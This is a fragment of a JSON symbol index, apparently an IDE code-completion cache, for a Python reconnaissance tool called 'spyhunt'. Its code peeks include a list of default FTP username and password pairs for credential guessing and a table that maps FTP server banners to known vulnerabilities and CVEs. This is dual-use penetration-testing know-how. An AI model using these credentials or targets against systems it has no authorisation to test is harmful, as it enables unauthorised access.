        "peekOfCode": "header = {\"User-Agent\": user_agent}\nasync def update_script():\n    try:\n        # Store current version\n        current_version = \"1.0.0\"  # Replace with your version tracking system\n        backup_dir = \"backups\"\n        print(f\"{Fore.CYAN}Checking for updates...{Style.RESET_ALL}\")\n        # Create backups directory if it doesn't exist\n        if not os.path.exists(backup_dir):\n            os.makedirs(backup_dir)",
        "detail": "spyhunt",
        "documentation": {}
    },
    {
        "label": "DEFAULT_FTP_PORT",
        "kind": 5,
        "importPath": "spyhunt",
        "description": "spyhunt",
        "peekOfCode": "DEFAULT_FTP_PORT = 21\nCOMMON_FTP_CREDS = [\n    (\"admin\", \"admin\"),\n    (\"ftp\", \"ftp\"),\n    (\"test\", \"test\"),\n    (\"anonymous\", \"anonymous\"),\n    (\"anonymous\", \"guest\"),\n    (\"admin\", \"password\"),\n    (\"administrator\", \"admin\"),\n    (\"administrator\", \"password\"),",
        "detail": "spyhunt",
        "documentation": {}
    },
    {
        "label": "COMMON_FTP_CREDS",
        "kind": 5,
        "importPath": "spyhunt",
        "description": "spyhunt",
        "peekOfCode": "COMMON_FTP_CREDS = [\n    (\"admin\", \"admin\"),\n    (\"ftp\", \"ftp\"),\n    (\"test\", \"test\"),\n    (\"anonymous\", \"anonymous\"),\n    (\"anonymous\", \"guest\"),\n    (\"admin\", \"password\"),\n    (\"administrator\", \"admin\"),\n    (\"administrator\", \"password\"),\n    (\"user\", \"user\"),",
        "detail": "spyhunt",
        "documentation": {}
    },
    {
        "label": "KNOWN_VULN_BANNERS",
        "kind": 5,
        "importPath": "spyhunt",
        "description": "spyhunt",
        "peekOfCode": "KNOWN_VULN_BANNERS = {\n    \"vsFTPd 2.3.4\": \"Critical Backdoor (CVE-2011-2523). Shell listening on port 6200.\",\n    \"ProFTPD 1.3.3c\": \"Potential remote command execution vulnerabilities (e.g., CVE-2010-4221 if mod_site_misc is enabled).\",\n    \"ProFTPD 1.3.5\": \"Potential RCE via mod_copy (CVE-2015-3306). Verify if mod_copy is enabled.\",\n    \"Microsoft FTP Service\": \"Various vulnerabilities depending on version (e.g., IIS 7.5 DoS CVE-2010-3972). Check version and patch level.\",\n    \"Ability Server 2.34\": \"Directory Traversal vulnerability (CVE-2004-1633).\",\n    \"Serv-U FTP Server\": \"Versions < 15.1.7.259 may have multiple vulnerabilities (e.g., CVE-2019-12181 Directory Traversal). Verify version.\",\n}\ndef check_banner_vulnerabilities(banner):\n    print(",
        "detail": "spyhunt",
        "documentation": {}
    },
    {
        "label": "action_taken",
        "kind": 5,
        "importPath": "spyhunt",
        "description": "spyhunt",
        "peekOfCode": "action_taken = any(vars(args).values())\nif not action_taken and not args.update:\n    action_args_present = False\n    for arg_name, arg_value in vars(args).items():\n        if arg_value and arg_name not in [\n            \"save\",\n            \"wordlist\",\n            \"threads\",\n            \"verbose\",\n            \"concurrency\",",
        "detail": "spyhunt",
        "documentation": {}
    }
]